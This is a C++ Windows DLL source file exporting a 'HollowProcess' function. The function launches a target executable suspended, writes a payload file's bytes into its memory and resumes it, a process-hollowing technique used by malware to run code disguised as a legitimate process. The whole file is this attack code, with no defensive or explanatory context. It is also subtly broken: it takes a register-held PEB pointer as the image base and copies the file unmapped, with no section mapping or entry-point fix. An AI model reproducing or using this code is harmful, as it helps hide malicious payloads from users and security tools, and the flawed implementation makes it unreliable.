
#include "pch.h"

#include <windows.h>
#include <string>
#include <winternl.h>
#include <tlhelp32.h>

#include <windows.h>
#include <string>

extern "C" __declspec(dllexport) int HollowProcess(const wchar_t* targetPath, const wchar_t* payloadPath)
{
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };


    if (!CreateProcessW(
        targetPath,        
        NULL,               
        NULL, NULL, FALSE,
        CREATE_SUSPENDED,   
        NULL, NULL, &si, &pi))
    {
        return 0;
    }

    HANDLE hFile = CreateFileW(payloadPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        TerminateProcess(pi.hProcess, 0);
        return 0;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* fileBuffer = (BYTE*)VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!fileBuffer)
    {
        CloseHandle(hFile);
        TerminateProcess(pi.hProcess, 0);
        return 0;
    }

    DWORD bytesRead;
    ReadFile(hFile, fileBuffer, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx))
    {
        VirtualFree(fileBuffer, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        return 0;
    }

#ifdef _WIN64
    LPVOID remoteImageBase = (LPVOID)(ctx.Rcx); //  x64
#else
    LPVOID remoteImageBase = (LPVOID)(ctx.Ebx + 8); //  x86
#endif


    WriteProcessMemory(pi.hProcess, remoteImageBase, fileBuffer, fileSize, NULL);

    VirtualFree(fileBuffer, 0, MEM_RELEASE);


    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 1; 
}